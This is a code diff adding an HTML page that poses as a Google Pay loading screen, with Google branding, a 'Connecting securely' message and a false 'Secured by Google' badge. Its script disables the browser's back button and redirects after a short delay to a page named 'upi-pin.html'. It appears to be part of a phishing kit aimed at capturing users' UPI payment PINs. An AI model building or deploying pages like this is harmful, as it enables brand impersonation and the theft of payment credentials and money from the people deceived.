@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Google Pay</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      position: fixed;
+    }
+    
+    body {
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Google Sans', 'Roboto', sans-serif;
+    }
+    
+    .content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 15px;
+      box-sizing: border-box;
+    }
+    
+    .logo-container {
+      animation: fadeInScale 0.6s ease-out;
+      margin-bottom: 25px;
+    }
+    
+    .gpay-logo {
+      width: clamp(100px, 30vw, 140px);
+      height: auto;
+      animation: logoFloat 3s ease-in-out infinite;
+    }
+    
+    .loading-text {
+      margin-top: 30px;
+      font-size: clamp(16px, 4.5vw, 20px);
+      color: #5f6368;
+      opacity: 0;
+      animation: fadeInUp 0.8s 0.4s forwards;
+      font-weight: 500;
+      text-align: center;
+    }
+    
+    .status {
+      margin-top: 10px;
+      font-size: clamp(13px, 3.5vw, 15px);
+      color: #34a853;
+      opacity: 0;
+      animation: fadeInUp 0.8s 0.7s forwards;
+      font-weight: 600;
+      text-align: center;
+    }
+    
+    .spinner-container {
+      margin-top: 25px;
+      opacity: 0;
+      animation: fadeInUp 0.8s 1s forwards;
+    }
+    
+    .spinner {
+      width: 45px;
+      height: 45px;
+      border: 4px solid #f0f0f0;
+      border-top: 4px solid #4285f4;
+      border-right: 4px solid #34a853;
+      border-bottom: 4px solid #fbbc04;
+      border-left: 4px solid #ea4335;
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+    }
+    
+    .progress-dots {
+      display: flex;
+      gap: 8px;
+      margin-top: 20px;
+      opacity: 0;
+      animation: fadeInUp 0.8s 1.3s forwards;
+    }
+    
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      animation: dotPulse 1.4s ease-in-out infinite;
+    }
+    
+    .dot:nth-child(1) {
+      background: #4285f4;
+      animation-delay: 0s;
+    }
+    
+    .dot:nth-child(2) {
+      background: #ea4335;
+      animation-delay: 0.2s;
+    }
+    
+    .dot:nth-child(3) {
+      background: #fbbc04;
+      animation-delay: 0.4s;
+    }
+    
+    .dot:nth-child(4) {
+      background: #34a853;
+      animation-delay: 0.6s;
+    }
+    
+    .security-badge {
+      position: absolute;
+      bottom: 25px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(52, 168, 83, 0.1);
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 12px;
+      color: #34a853;
+      font-weight: 600;
+    }
+    
+    @keyframes fadeInScale {
+      from { opacity: 0; transform: scale(0.5); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    @keyframes logoFloat {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-10px); }
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    @keyframes dotPulse {
+      0%, 100% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.3); opacity: 0.5; }
+    }
+  </style>
+</head>
+<body>
+  <div class="content">
+    <div class="logo-container">
+      <img src="google-pay-icon.png" alt="Google Pay" class="gpay-logo">
+    </div>
+    
+    <div class="loading-text">Opening Google Pay…</div>
+    <div class="status">Connecting securely</div>
+    
+    <div class="spinner-container">
+      <div class="spinner"></div>
+    </div>
+    
+    <div class="progress-dots">
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+  
+  <div class="security-badge">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+    </svg>
+    <span>Secured by Google</span>
+  </div>
+
+  <script>
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+      history.go(1);
+    };
+    
+    setTimeout(() => {
+      window.location.href = 'upi-pin.html';
+    }, 2500);
+  </script>
+</body>
+</html>
